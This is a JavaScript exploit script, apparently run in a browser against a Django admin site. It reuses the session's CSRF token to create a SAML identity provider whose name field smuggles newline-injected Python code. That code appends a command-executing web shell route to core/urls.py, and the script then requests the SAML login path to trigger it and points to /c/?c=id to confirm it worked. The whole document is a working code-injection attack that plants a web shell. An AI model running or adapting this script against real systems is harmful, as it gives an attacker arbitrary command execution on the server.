 (function() {
     function getCookie(n){let b=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return b?b.pop():''}
     const id = Math.floor(Math.random() * 9999);
     const slug = 'web-' + id;

     // The payload: using \n explicitly to break the comment line in the .py file
     // const name = `E${id}\nimport os;os.system("echo 'from django.urls import re_path as A;from django.http import HttpResponse as B;import os;urlpatterns.insert(0,A(\'^c/?$\',lambda r:B(os.popen(r.GET.get(\'c\')).read())))' >> ./core/urls.py")`;
     const py = "f=open('core/urls.py','a');f.write('\\nfrom django.urls import re_path as A;from django.http import HttpResponse as B;import os;urlpatterns.insert(0,A(\\'^c/?$\\',lambda r:B(os.popen(r.GET.get(\\'c\\')).read())))');f.close()";
     const name = `E${id}\n${py}`;


     const formData = new FormData();
     formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
     formData.append('name', name);
     formData.append('slug', slug);
     formData.append('protocol', 'saml');
     formData.append('status', 'active');
     formData.append('priority', '0');
     formData.append('use_custom_attribute_map', 'on');
     formData.append('attribute_mapping', '{"email":["mail"]}');
     formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://x.com"><md:IDPSSODescriptor
 protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
 Location="https://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
     formData.append('_save', 'Save');

     console.log("Creating Identity Provider...");
     fetch('/admin/uac/identityprovider/add/', { method: 'POST', body: formData })
     .then(r => {
         if (r.ok || r.status === 200) {
             console.log("IDP Created Successfully. Slug: " + slug);
             const triggerUrl = '/saml2/login/' + slug + '/'; // Note the trailing slash
             console.log("Triggering Webshell via: " + triggerUrl);

             // Trigger the wenshell
             return fetch(triggerUrl);
         } else {
             throw new Error("POST failed with status: " + r.status);
         }
     })
     .then(r => {
         if (r.status === 404) {
             console.error("FAILED: Trigger URL returned 404. The IDP might be inactive or protocol is not SAML.");
         } else {
             console.log("Webshell creation Triggered! Response code: " + r.status);
             console.log("check /c/?c=id");
             // setTimeout(() => { window.open('/c/?c=id', '_blank'); }, 5000);
         }
     })
     .catch(e => console.error(e));
 })();

